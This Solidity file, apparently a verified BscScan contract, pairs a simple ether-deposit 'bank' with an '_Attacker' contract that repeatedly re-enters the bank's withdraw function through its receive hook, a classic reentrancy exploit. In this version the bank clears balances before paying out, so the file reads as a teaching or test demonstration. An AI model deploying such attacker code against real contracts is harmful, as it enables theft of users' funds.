/**
 *Submitted for verification at BscScan.com on 2022-06-25
*/

pragma solidity ^0.8.15;

// import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
// import "@openzeppelin/contracts/utils/Address.sol";

library Address {
   function isContract(address account) internal view returns (bool) {
                return account.code.length > 0;
    }
 
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, "Address: low-level call failed");
    }
   function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
   function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
   function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0){
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
contract Etherbank{ //is ReentrancyGuard {  
 
  using Address for address payable;
  mapping(address=>uint) public  balances;
  
  function deposit()external payable{
      balances[msg.sender] +=msg.value;
  }
  function withdraw()external  {//nonReentrant {
      uint bal=balances[msg.sender]; 
      require(bal>0,"withdrawl amount is not enough");
    
       uint accountbalance=bal;
        balances[msg.sender]=0;
     (bool sent,)=msg.sender.call{value: accountbalance,gas:100000}("");
     require(sent,"failed to send Ether");
    //    payable(msg.sender).sendValue(accountbalance);
         //    balances[msg.sender]=0;
      
  }
  function getbalance()public view returns(uint){
      return address(this).balance;
  }
}

contract _Attacker{
  Etherbank public  etherbank;

     address private owner;
    //  uint  public count=0;
    constructor(address etherbankaddress){
        etherbank=Etherbank(etherbankaddress);
     }
    function attack()external payable{//onlyowner{
       if(msg.value>0){
        etherbank.deposit{value:msg.value}();
        
        etherbank.withdraw();
        }   
         }
    receive()external payable{
       if(address(etherbank).balance>0){
           
            etherbank.withdraw();
            // console.log("receive Amount");
         }
    }
    function getbalance()external view returns(uint){
        return address(this).balance;
    }
}